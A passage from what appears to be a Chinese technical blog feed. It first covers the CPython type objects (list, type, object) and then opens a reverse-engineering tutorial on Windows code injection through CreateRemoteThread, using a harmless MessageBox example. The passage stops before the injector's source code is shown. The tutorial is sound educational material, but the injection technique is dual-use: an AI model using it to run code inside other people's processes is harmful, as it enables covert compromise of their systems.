class=""><p>由于list类型对象全局唯一，在C语言层面作为一个全局静态变量静态定义即可。python也是怎么做的</p><img src="/2022/05/06/python%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90-python%E4%B8%AD%E4%B8%80%E5%88%87%E7%9A%86%E5%AF%B9%E8%B1%A1/6.png" class=""><p>顺藤摸瓜：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">PyTypeObject PyList_Type = &#123;</span><br><span class="line">    PyVarObject_HEAD_INIT(&amp;PyType_Type, <span class="number">0</span>)<span class="comment">//变长对象头部初始化</span></span><br><span class="line">    <span class="string">&quot;list&quot;</span>,<span class="comment">//名称</span></span><br><span class="line">    <span class="keyword">sizeof</span>(PyListObject),<span class="comment">//分配的内存大小</span></span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    (destructor)list_dealloc,                   <span class="comment">/* tp_dealloc */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_print */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_getattr */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_setattr */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_reserved */</span></span><br><span class="line">    (reprfunc)list_repr,                        <span class="comment">/* tp_repr */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_as_number */</span></span><br><span class="line">    &amp;list_as_sequence,                          <span class="comment">/* tp_as_sequence */</span></span><br><span class="line">    &amp;list_as_mapping,                           <span class="comment">/* tp_as_mapping */</span></span><br><span class="line">    PyObject_HashNotImplemented,                <span class="comment">/* tp_hash */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_call */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_str */</span></span><br><span class="line">    PyObject_GenericGetAttr,                    <span class="comment">/* tp_getattro */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_setattro */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_as_buffer */</span></span><br><span class="line">    Py_TPFLAGS_DEFAULT | Py_TPFLAGS_HAVE_GC |</span><br><span class="line">        Py_TPFLAGS_BASETYPE | Py_TPFLAGS_LIST_SUBCLASS, <span class="comment">/* tp_flags */</span></span><br><span class="line">    list___init____doc__,                       <span class="comment">/* tp_doc */</span></span><br><span class="line">    (traverseproc)list_traverse,                <span class="comment">/* tp_traverse */</span></span><br><span class="line">    (inquiry)_list_clear,                       <span class="comment">/* tp_clear */</span></span><br><span class="line">    list_richcompare,                           <span class="comment">/* tp_richcompare */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_weaklistoffset */</span></span><br><span class="line">    list_iter,                                  <span class="comment">/* tp_iter */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_iternext */</span></span><br><span class="line">    list_methods,                               <span class="comment">/* tp_methods */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_members */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_getset */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_base */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_dict */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_descr_get */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_descr_set */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_dictoffset */</span></span><br><span class="line">    (initproc)list___init__,                    <span class="comment">/* tp_init */</span></span><br><span class="line">    PyType_GenericAlloc,                        <span class="comment">/* tp_alloc */</span></span><br><span class="line">    PyType_GenericNew,                          <span class="comment">/* tp_new */</span></span><br><span class="line">    PyObject_GC_Del,                            <span class="comment">/* tp_free */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>至此可以看到一些list类型对象的一些个性行为。比如list_methods，跟随：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">tatic PyMethodDef list_methods[] = &#123;</span><br><span class="line">    &#123;<span class="string">&quot;__getitem__&quot;</span>, (PyCFunction)list_subscript, METH_O|METH_COEXIST, <span class="string">&quot;x.__getitem__(y) &lt;==&gt; x[y]&quot;</span>&#125;,</span><br><span class="line">    LIST___REVERSED___METHODDEF</span><br><span class="line">    LIST___SIZEOF___METHODDEF</span><br><span class="line">    LIST_CLEAR_METHODDEF</span><br><span class="line">    LIST_COPY_METHODDEF</span><br><span class="line">    LIST_APPEND_METHODDEF</span><br><span class="line">    LIST_INSERT_METHODDEF</span><br><span class="line">    LIST_EXTEND_METHODDEF</span><br><span class="line">    LIST_POP_METHODDEF</span><br><span class="line">    LIST_REMOVE_METHODDEF</span><br><span class="line">    LIST_INDEX_METHODDEF</span><br><span class="line">    LIST_COUNT_METHODDEF</span><br><span class="line">    LIST_REVERSE_METHODDEF</span><br><span class="line">    LIST_SORT_METHODDEF</span><br><span class="line">    &#123;<span class="literal">NULL</span>,              <span class="literal">NULL</span>&#125;           <span class="comment">/* sentinel */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>从PyList_Type的构成可以看到，用于初始化list类型对象头部的语句是：<code>PyVarObject_HEAD_INIT(&amp;PyType_Type, 0)</code>可以看到使用<code>&amp;PyType_Type</code>初始化变长对象头部中的定长对象头部分（因为这是对象共有部分）。</p><h5 id="PyType-Type"><a href="#PyType-Type" class="headerlink" title="PyType_Type"></a>PyType_Type</h5><p>前面提到。</p><p>进一步探讨<code>PyType_Type</code>，跟踪，来到&#x2F;Objects&#x2F;typeobject.c，实际上这个结构体就是<strong>类型变量的结构体</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">PyTypeObject PyType_Type = &#123;</span><br><span class="line">    PyVarObject_HEAD_INIT(&amp;PyType_Type, <span class="number">0</span>)</span><br><span class="line">    <span class="string">&quot;type&quot;</span>,                                     <span class="comment">/* tp_name */</span></span><br><span class="line">    <span class="keyword">sizeof</span>(PyHeapTypeObject),                   <span class="comment">/* tp_basicsize */</span></span><br><span class="line">    <span class="keyword">sizeof</span>(PyMemberDef),                        <span class="comment">/* tp_itemsize */</span></span><br><span class="line">    (destructor)type_dealloc,                   <span class="comment">/* tp_dealloc */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_print */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_getattr */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_setattr */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_reserved */</span></span><br><span class="line">    (reprfunc)type_repr,                        <span class="comment">/* tp_repr */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_as_number */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_as_sequence */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_as_mapping */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_hash */</span></span><br><span class="line">    (ternaryfunc)type_call,                     <span class="comment">/* tp_call */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_str */</span></span><br><span class="line">    (getattrofunc)type_getattro,                <span class="comment">/* tp_getattro */</span></span><br><span class="line">    (setattrofunc)type_setattro,                <span class="comment">/* tp_setattro */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_as_buffer */</span></span><br><span class="line">    Py_TPFLAGS_DEFAULT | Py_TPFLAGS_HAVE_GC |</span><br><span class="line">        Py_TPFLAGS_BASETYPE | Py_TPFLAGS_TYPE_SUBCLASS,         <span class="comment">/* tp_flags */</span></span><br><span class="line">    type_doc,                                   <span class="comment">/* tp_doc */</span></span><br><span class="line">    (traverseproc)type_traverse,                <span class="comment">/* tp_traverse */</span></span><br><span class="line">    (inquiry)type_clear,                        <span class="comment">/* tp_clear */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_richcompare */</span></span><br><span class="line">    offsetof(PyTypeObject, tp_weaklist),        <span class="comment">/* tp_weaklistoffset */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_iter */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_iternext */</span></span><br><span class="line">    type_methods,                               <span class="comment">/* tp_methods */</span></span><br><span class="line">    type_members,                               <span class="comment">/* tp_members */</span></span><br><span class="line">    type_getsets,                               <span class="comment">/* tp_getset */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_base */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_dict */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_descr_get */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_descr_set */</span></span><br><span class="line">    offsetof(PyTypeObject, tp_dict),            <span class="comment">/* tp_dictoffset */</span></span><br><span class="line">    type_init,                                  <span class="comment">/* tp_init */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_alloc */</span></span><br><span class="line">    type_new,                                   <span class="comment">/* tp_new */</span></span><br><span class="line">    PyObject_GC_Del,                            <span class="comment">/* tp_free */</span></span><br><span class="line">    (inquiry)type_is_gc,                        <span class="comment">/* tp_is_gc */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>python内建类型和自定义类对应的PyTypeObject对象都是通过PyType_Type创建的。PyType_Type在python类型机制中是一个至关重要的对象，他是所有类型的类型，称为<strong>元类型</strong>，类型也是对象，其类型指向自身，这一点可以在上述代码中<code>PyVarObject_HEAD_INIT(&amp;PyType_Type, 0)</code>得到印证，因为将其自身作为ob_type的值</p><img src="/2022/05/06/python%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90-python%E4%B8%AD%E4%B8%80%E5%88%87%E7%9A%86%E5%AF%B9%E8%B1%A1/7.png" class=""><h4 id="PyBaseObject-Type，类型之基"><a href="#PyBaseObject-Type，类型之基" class="headerlink" title="PyBaseObject_Type，类型之基"></a>PyBaseObject_Type，类型之基</h4><p>object是另一个特殊的类，他<strong>是所有类型的基类</strong>，在所有类型的结构体中由字段<code>tp_base</code>指明</p><p><code>PyList_Type.tp_base:</code></p><img src="/2022/05/06/python%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90-python%E4%B8%AD%E4%B8%80%E5%88%87%E7%9A%86%E5%AF%B9%E8%B1%A1/8.png" class=""><p>发现相应的字段并没有进行初始化。根据理论，这个值不应该为0，因为他是由一个基类派生出来的。因此应该是在源码的某处完成了该字段的初始化，查找PyList_Type发现几处出现，这里需要记住一些源码阅读的技巧：</p><img src="/2022/05/06/python%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90-python%E4%B8%AD%E4%B8%80%E5%88%87%E7%9A%86%E5%AF%B9%E8%B1%A1/9.png" class=""><p>尽管查找结果有许多处，但<strong>首先可以关注文件名，进一步关注内容</strong>，从而定位到&#x2F;Objects&#x2F;object.c中的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_Py_ReadyTypes(<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//略，都是些形式差不多的其他类型判断语句</span></span><br><span class="line"><span class="keyword">if</span> (PyType_Ready(&amp;PyList_Type) &lt; <span class="number">0</span>)</span><br><span class="line">        Py_FatalError(<span class="string">&quot;Can&#x27;t initialize list type&quot;</span>);</span><br><span class="line">    <span class="comment">//略</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原来是需要进一步调用<code>PyType_Ready</code>完成最终的初始化是python&#x2F;C API，文档相关描述：</p><blockquote><p>int <code>PyType_Ready</code>(<a href="https://docs.python.org/zh-cn/3.7/c-api/type.html?highlight=pytype_ready#c.PyTypeObject">PyTypeObject</a> *<em>type</em>)</p><p>Finalize a type object. <strong>This should be called on all type objects to finish their initialization.</strong> This function is responsible for adding inherited slots from a type’s base class. Return <code>0</code> on success, or return <code>-1</code> and sets an exception on error.</p></blockquote><p>跟踪该函数，来到&#x2F;Objects&#x2F;tyoeobject.h中找到函数的定义：代码有点多，多是一些其他字段的设置，这里先关注<strong>类型基类的设置部分</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">PyType_Ready</span><span class="params">(PyTypeObject *type)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="comment">/* Initialize tp_base (defaults to BaseObject unless that&#x27;s us) */</span></span><br><span class="line">    base = type-&gt;tp_base;</span><br><span class="line">    <span class="keyword">if</span> (base == <span class="literal">NULL</span> &amp;&amp; type != &amp;PyBaseObject_Type) &#123;</span><br><span class="line">        base = type-&gt;tp_base = &amp;PyBaseObject_Type;</span><br><span class="line">        Py_INCREF(base);</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当tp_base为null且类型不是PyBaseObject_Type时，设置基类指向PyBaseObject_Type。即设置所有非PyBaseObject_Type类型的类型中的tp_base指向PyBaseObject_Type（好绕…），不管如何，大致意思是PyBaseObject_Type是所有类型的基类型，跟踪其定义，来到<code>/Objects/tyoeobject.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">PyTypeObject PyBaseObject_Type = &#123;</span><br><span class="line">    PyVarObject_HEAD_INIT(&amp;PyType_Type, <span class="number">0</span>)</span><br><span class="line">    <span class="string">&quot;object&quot;</span>,                                   <span class="comment">/* tp_name */</span></span><br><span class="line">    <span class="keyword">sizeof</span>(PyObject),                           <span class="comment">/* tp_basicsize */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_itemsize */</span></span><br><span class="line">    object_dealloc,                             <span class="comment">/* tp_dealloc */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_print */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_getattr */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_setattr */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_reserved */</span></span><br><span class="line">    object_repr,                                <span class="comment">/* tp_repr */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_as_number */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_as_sequence */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_as_mapping */</span></span><br><span class="line">    (hashfunc)_Py_HashPointer,                  <span class="comment">/* tp_hash */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_call */</span></span><br><span class="line">    object_str,                                 <span class="comment">/* tp_str */</span></span><br><span class="line">    PyObject_GenericGetAttr,                    <span class="comment">/* tp_getattro */</span></span><br><span class="line">    PyObject_GenericSetAttr,                    <span class="comment">/* tp_setattro */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_as_buffer */</span></span><br><span class="line">    Py_TPFLAGS_DEFAULT | Py_TPFLAGS_BASETYPE,   <span class="comment">/* tp_flags */</span></span><br><span class="line">    PyDoc_STR(<span class="string">&quot;object()\n--\n\nThe most base type&quot;</span>),  <span class="comment">/* tp_doc */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_traverse */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_clear */</span></span><br><span class="line">    object_richcompare,                         <span class="comment">/* tp_richcompare */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_weaklistoffset */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_iter */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_iternext */</span></span><br><span class="line">    object_methods,                             <span class="comment">/* tp_methods */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_members */</span></span><br><span class="line">    object_getsets,                             <span class="comment">/* tp_getset */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_base */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_dict */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_descr_get */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_descr_set */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_dictoffset */</span></span><br><span class="line">    object_init,                                <span class="comment">/* tp_init */</span></span><br><span class="line">    PyType_GenericAlloc,                        <span class="comment">/* tp_alloc */</span></span><br><span class="line">    object_new,                                 <span class="comment">/* tp_new */</span></span><br><span class="line">    PyObject_Del,                               <span class="comment">/* tp_free */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中<code> 0,                                          /* tp_base */</code>可以看到类型基类的PyBaseObject_Type其基类为空，这是因为所有基类到这里就是终点，需要一个出口，否则陷入定义的死循环。</p><img src="/2022/05/06/python%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90-python%E4%B8%AD%E4%B8%80%E5%88%87%E7%9A%86%E5%AF%B9%E8%B1%A1/10.png" class=""><p>可以总结出来的是：</p><ul><li><p>所有类型的元类型是<code>PyType_Type</code>(类型的ob_type指向PyType_Type),</p></li><li><p>所有类型的基类是<code>PyBaseObject_Type</code>（非PyBaseObject_Type类型的tp_base指向PyBaseObject_Type）</p></li></ul><p>最后补一个十分详细的PyObject 个字段的描述：<a href="https://www.rddoc.com/doc/Python/3.6.0/zh/c-api/typeobj/">Link</a></p>]]></content>
      
      
      <categories>
          
          <category> 源码 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python源码剖析 </tag>
            
            <tag> 源码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆核系列No.11--代码注入</title>
      <link href="/2022/05/06/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-11-%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/"/>
      <url>/2022/05/06/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-11-%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h3 id="代码注入"><a href="#代码注入" class="headerlink" title="代码注入"></a>代码注入</h3><blockquote><p><strong>代码注入</strong>是一种想目标进程插入<strong>具备独立运行能力的代码</strong>并使之运行的技术，由于一般是通过调用CreateRemoteThread APi以远程线程形式运行插入的代码，因此也被称为<strong>线程注入</strong>。</p></blockquote><p>例子，如若需要将下列用于弹出Windows消息框的代码注入的到目标进程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DOWRD WINAPI <span class="title function_">ThreadProc</span><span class="params">(LPVOID lparam)</span></span><br><span class="line">&#123;</span><br><span class="line">    MessageBox(<span class="literal">NULL</span>, <span class="string">&quot;www.reversecore.com&quot;</span>, <span class="string">&quot;ReverseCore&quot;</span>, MB_OK);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="使用DLL注入的方式实现"><a href="#使用DLL注入的方式实现" class="headerlink" title="使用DLL注入的方式实现"></a>使用DLL注入的方式实现</h4><p>在DLL注入技术里，会将代码放入某个DLL文件，在将整个DLL文件注入到目标进程中，使用OD载入目标程序，开启调试选项中的 “ 中断在新模块载入处” 的选项，使程序处于运行状态，使用DLL注入器将DLL注入，会来到如下代码：</p><img src="/2022/05/06/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-11-%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/1.png" class=""><p>在0x10001002 - 0x10001007处的两条指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x10001002 push 10009290//字符串ReverseCore的起始位置</span><br><span class="line">0x10001007 push 1000929c//字符串www.reversecore.com的位置</span><br><span class="line">//...</span><br><span class="line">0x1000100Ecall DOWRD ptr ds:[100080F0]//API入口</span><br></pre></td></tr></table></figure><p>关注DLL注入方式中有关地址的部分，可以发现：DLL代码使用的所有数据都是位于DLL自己载入内存时的数据区域。这样有什么坏处？</p><ul><li>需要将整个DLL的内容装进内存，占用内存大</li><li>痕迹明显，很容易被察觉</li><li>…</li></ul><h4 id="使用代码注入的方式实现"><a href="#使用代码注入的方式实现" class="headerlink" title="使用代码注入的方式实现"></a>使用代码注入的方式实现</h4><p><strong>而代码注入则是指注入必要的代码，并且代码所使用的数据一同注入，并且在完成注入代码的运行时需要明确指出数据的地址。</strong> 克服了一定的DLL注入的缺点</p><p><strong>demo演示</strong>：</p><img src="/2022/05/06/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-11-%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/2.png" class=""><p>使用代码注入器–CodeInjection.exe输入目标进程对应的pid完成代码注入，实现弹窗。</p><hr><h4 id="源码剖析"><a href="#源码剖析" class="headerlink" title="源码剖析"></a>源码剖析</h4><p>先贴一下CodeInjection的完整代码，后面展开分析</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span 